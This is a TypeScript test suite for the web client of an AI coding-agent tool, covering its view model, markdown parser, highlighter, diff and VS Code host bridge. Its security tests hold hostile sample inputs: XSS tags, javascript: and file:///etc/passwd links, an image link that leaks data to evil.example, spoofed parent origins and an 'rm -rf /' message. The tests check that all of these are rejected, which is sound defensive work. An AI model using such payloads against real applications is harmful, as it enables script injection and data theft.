/**
 * Track 4, U2: the web app's logic without a browser: the view model (protocol messages in,
 * screen state out), the markdown parser's safety, the highlighter and the line diff.
 */
import { describe, expect, test } from 'bun:test';
import type { ServerMessage } from '../src/server/protocol.ts';
import { lineDiff } from '../web/diff.ts';
import { highlight } from '../web/highlight.ts';
import { detectHost, fileRef, parseFromHost } from '../web/host.ts';
import { type Inline, parseInline, parseMarkdown } from '../web/markdown.ts';
import { type AppState, INITIAL_STATE, reduce, waitingAsks } from '../web/model.ts';

const STATUS = { model: 'local/m', tokensIn: 0, tokensOut: 0, contextPct: 0, yolo: false };
const OPTIONS = { providers: ['claude', 'local'], modes: ['default', 'learn'], varieties: ['mgp'] };
const snapshot = (conversation: string, sessionId = `s-${conversation}`): ServerMessage => ({
  type: 'snapshot',
  info: { conversation, sessionId, cwd: '/p', title: '' },
  items: [
    { kind: 'user', text: 'earlier' },
    { kind: 'tool', id: 't0', name: 'read', summary: 'read a.ts', status: 'ok', output: '1 line' },
    { kind: 'assistant', text: 'done before' },
  ],
  running: false,
  live: '',
  asks: [],
  status: STATUS,
  options: OPTIONS,
});
const run = (msgs: Array<Parameters<typeof reduce>[1]>, from: AppState = INITIAL_STATE) =>
  msgs.reduce(reduce, from);

describe('web view model (U2)', () => {
  test('a snapshot becomes entries and the open conversation', () => {
    const s = run([{ type: 'hello.ok', protocol: 1, version: 't' }, snapshot('c1')]);
    expect(s.connection).toBe('open');
    expect(s.active).toBe('c1');
    expect(s.order).toEqual(['c1']);
    expect(s.conversations.c1?.entries.map((e) => e.kind)).toEqual(['user', 'tool', 'assistant']);
  });

  test('a turn: the user line, streamed text flushed before a tool, the card updated', () => {
    const s = run([
      snapshot('c1'),
      { type: 'turn.start', conversation: 'c1', text: 'fix it' },
      { type: 'text.delta', conversation: 'c1', delta: 'Looking ' },
      { type: 'text.delta', conversation: 'c1', delta: 'now.' },
      {
        type: 'tool.start',
        conversation: 'c1',
        id: 't1',
        name: 'edit',
        summary: 'edit a.ts',
        display: { kind: 'diff', path: 'a.ts', before: 'x', after: 'y' },
      },
      { type: 'ask', conversation: 'c1', askId: 'a1', summary: 'edit a.ts', alwaysRule: 'edit:**' },
      { type: 'ask.closed', conversation: 'c1', askId: 'a1', answer: 'yes' },
      { type: 'tool.end', conversation: 'c1', id: 't1', status: 'ok', output: 'Edited', ms: 12 },
      { type: 'text.delta', conversation: 'c1', delta: 'Fixed.' },
      { type: 'turn.end', conversation: 'c1', result: 'ok' },
    ]);
    const c = s.conversations.c1;
    expect(c?.running).toBe(false);
    expect(c?.live).toBe('');
    expect(c?.asks).toEqual([]);
    const tail = c?.entries.slice(3) ?? [];
    expect(
      tail.map((e) => (e.kind === 'tool' ? `tool:${e.card.status}` : `${e.kind}:${e.text}`)),
    ).toEqual(['user:fix it', 'assistant:Looking now.', 'tool:ok', 'assistant:Fixed.']);
  });

  test('Stop, errors, and a tool.end the client never saw start', () => {
    const s = run([
      snapshot('c1'),
      { type: 'turn.start', conversation: 'c1', text: 'go' },
      { type: 'ask', conversation: 'c1', askId: 'a1', summary: 'write x', alwaysRule: 'write:**' },
      { type: 'tool.end', conversation: 'c1', id: 'zz', status: 'denied', output: 'denied', ms: 1 },
      { type: 'turn.end', conversation: 'c1', result: 'aborted' },
      { type: 'turn.start', conversation: 'c1', text: 'again' },
      { type: 'turn.end', conversation: 'c1', result: 'error', error: 'Rate limited.' },
      { type: 'error', message: 'Unknown mode "x".', conversation: 'c1' },
      { type: 'error', message: 'Protocol mismatch.' },
    ]);
    const kinds = s.conversations.c1?.entries
      .slice(3)
      .map((e) => (e.kind === 'tool' ? `tool:${e.card.status}` : `${e.kind}:${e.text}`));
    expect(kinds).toEqual([
      'user:go',
      'tool:denied',
      'notice:Stopped.',
      'user:again',
      'error:Rate limited.',
      'error:Unknown mode "x".',
    ]);
    expect(s.conversations.c1?.asks).toEqual([]);
    expect(s.error).toBe('Protocol mismatch.');
  });

  test('waiting questions are counted across conversations; duplicates are ignored', () => {
    const ask = (conversation: string, askId: string): ServerMessage => ({
      type: 'ask',
      conversation,
      askId,
      summary: 's',
      alwaysRule: 'r',
    });
    const s = run([
      snapshot('c1'),
      snapshot('c2'),
      ask('c1', 'a1'),
      ask('c1', 'a1'),
      ask('c2', 'a2'),
    ]);
    expect(waitingAsks(s)).toBe(2);
  });

  test('after a reconnect the views reset and the active session is selected again', () => {
    let s = run([
      { type: 'local.opening' },
      snapshot('c1', 'S1'),
      { type: 'local.opening' },
      snapshot('c2', 'S2'),
      { type: 'local.select', conversation: 'c1' },
    ]);
    expect(s.active).toBe('c1');
    s = run(
      [{ type: 'local.reset', focusSession: 'S1' }, snapshot('c7', 'S2'), snapshot('c8', 'S1')],
      s,
    );
    expect(s.order).toEqual(['c7', 'c8']);
    expect(s.active).toBe('c8');
    s = run([{ type: 'local.close', conversation: 'c8' }], s);
    expect(s.active).toBe('c7');
  });

  test('the title updates after the first turn', () => {
    const s = run([
      snapshot('c1'),
      {
        type: 'info',
        conversation: 'c1',
        info: { conversation: 'c1', sessionId: 'S9', cwd: '/p', title: 'fix it' },
      },
    ]);
    expect(s.conversations.c1?.title).toBe('fix it');
    expect(s.conversations.c1?.sessionId).toBe('S9');
  });
});

const texts = (nodes: Inline[]): string =>
  nodes.map((n) => ('text' in n ? n.text : 'children' in n ? texts(n.children) : '\n')).join('');

describe('markdown: safe by construction', () => {
  test('no HTML: tags stay text', () => {
    const blocks = parseMarkdown('<script>alert(1)</script> <img src=x onerror=alert(1)>');
    expect(blocks).toEqual([
      {
        type: 'paragraph',
        children: [
          { type: 'text', text: '<script>alert(1)</script> <img src=x onerror=alert(1)>' },
        ],
      },
    ]);
  });

  test('links: only http, https and mailto; anything else is plain text', () => {
    const links = (md: string) =>
      parseInline(md).flatMap((n) => (n.type === 'link' ? [n.href] : []));
    expect(links('[a](https://x.example) [b](mailto:me@x.example)')).toEqual([
      'https://x.example',
      'mailto:me@x.example',
    ]);
    expect(
      links('[a](javascript:alert) [b](data:text/html,x) [c](file:///etc/passwd) [d](vbscript:x)'),
    ).toEqual([]);
    expect(texts(parseInline('[click](javascript:alert)'))).toBe('click');
  });

  test('images are never loaded: they become a link to click instead', () => {
    const nodes = parseInline('![chart](https://evil.example/leak?d=secret)');
    expect(nodes).toEqual([
      {
        type: 'link',
        href: 'https://evil.example/leak?d=secret',
        children: [{ type: 'text', text: 'image: chart' }],
      },
    ]);
  });

  test('the blocks replies use', () => {
    const blocks = parseMarkdown(
      '## Plan\n\n1. read\n2. **edit**\n\n- one\n  - nested\n\n```py\nprint(1)\n```\n\n| a | b |\n|---|---|\n| 1 | `x` |\n\n> note\n\n---',
    );
    expect(blocks.map((b) => b.type)).toEqual([
      'heading',
      'list',
      'list',
      'code',
      'table',
      'quote',
      'rule',
    ]);
    expect(blocks[2]).toMatchObject({ ordered: false, items: [{ level: 0 }, { level: 1 }] });
    expect(blocks[3]).toEqual({ type: 'code', lang: 'py', text: 'print(1)' });
  });
});

describe('highlighter and diff', () => {
  test('keywords, strings, comments, numbers; unknown languages stay plain', () => {
    const t = highlight('const s = "a"; // why\nlet n = 42;', 'ts');
    expect(t.filter((x) => x.type !== 'plain').map((x) => `${x.type}:${x.text}`)).toEqual([
      'keyword:const',
      'string:"a"',
      'comment:// why',
      'keyword:let',
      'number:42',
    ]);
    expect(highlight('<b>x</b>', 'brainfuck')).toEqual([{ type: 'plain', text: '<b>x</b>' }]);
    expect(
      highlight('x = "unterminated', 'py')
        .map((x) => x.text)
        .join(''),
    ).toBe('x = "unterminated');
  });

  test('a line diff keeps context and marks what changed', () => {
    expect(lineDiff('a\nb\nc', 'a\nB\nc\nd')).toEqual([
      { op: ' ', text: 'a' },
      { op: '-', text: 'b' },
      { op: '+', text: 'B' },
      { op: ' ', text: 'c' },
      { op: '+', text: 'd' },
    ]);
    const big = Array.from({ length: 1500 }, (_, i) => `l${i}`).join('\n');
    expect(lineDiff(big, `${big}\nmore`).filter((l) => l.op !== ' ').length).toBeGreaterThan(0);
  });
});

describe('the host bridge (U4)', () => {
  const VS = 'vscode-webview://1a2b3c';

  test('host mode needs host=vscode and a VS Code webview as the parent', () => {
    expect(detectHost('', [VS])).toBeUndefined();
    expect(detectHost('#host=other', [VS])).toBeUndefined();
    expect(detectHost('#host=vscode', [])).toBeUndefined();
    expect(detectHost('#host=vscode', ['https://evil.example'])).toBeUndefined();
    expect(detectHost('#host=vscode', ['vscode-webview://x/../evil'])).toBeUndefined();
    expect(detectHost('#host=vscode&cwd=%2Fp', ['https://evil.example', VS])).toEqual({
      kind: 'vscode',
      parentOrigin: VS,
      cwd: '/p',
    });
  });

  test('a given parent is honoured only with the launch token', () => {
    // Without the token, `parent` in the fragment can't name some other page as the host.
    expect(detectHost('#host=vscode&parent=https%3A%2F%2Fevil.example', [])).toBeUndefined();
    expect(detectHost('#host=vscode&parent=https%3A%2F%2Fevil.example', [VS])?.parentOrigin).toBe(
      VS,
    );
    expect(detectHost('#host=vscode&token=t&parent=http%3A%2F%2F127.0.0.1%3A9', [])).toEqual({
      kind: 'vscode',
      parentOrigin: 'http://127.0.0.1:9',
    });
  });

  test('only well-formed host messages get through', () => {
    expect(parseFromHost({ type: 'insert', text: 'hi' })).toEqual({ type: 'insert', text: 'hi' });
    expect(parseFromHost({ type: 'answer', askId: 'a1', answer: 'yes' })).toEqual({
      type: 'answer',
      askId: 'a1',
      answer: 'yes',
    });
    for (const bad of [
      null,
      'insert',
      { type: 'insert' },
      { type: 'insert', text: 5 },
      { type: 'insert', text: 'x'.repeat(20_001) },
      { type: 'answer', askId: 'a1', answer: 'always' },
      { type: 'answer', askId: 'a'.repeat(101), answer: 'yes' },
      { type: 'answer', answer: 'yes' },
      { type: 'send', text: 'rm -rf /' },
    ]) {
      expect(parseFromHost(bad)).toBeUndefined();
    }
    // Extra fields are dropped, not passed on.
    expect(parseFromHost({ type: 'insert', text: 'hi', send: true })).toEqual({
      type: 'insert',
      text: 'hi',
    });
  });

  test('file references in replies', () => {
    expect(fileRef('src/agent.ts')).toEqual({ path: 'src/agent.ts' });
    expect(fileRef('src/agent.ts:42')).toEqual({ path: 'src/agent.ts', line: 42 });
    expect(fileRef('web/ui.tsx:10-20')).toEqual({ path: 'web/ui.tsx', line: 10 });
    expect(fileRef('./a.json')).toEqual({ path: './a.json' });
    expect(fileRef('../up/b.md:3')).toEqual({ path: '../up/b.md', line: 3 });
    for (const not of [
      'agent',
      'npm install',
      'https://x.ts',
      'a b.ts',
      'src/',
      '`x`',
      'x.ts:',
      'const a = 1',
    ]) {
      expect(fileRef(not)).toBeUndefined();
    }
  });
});
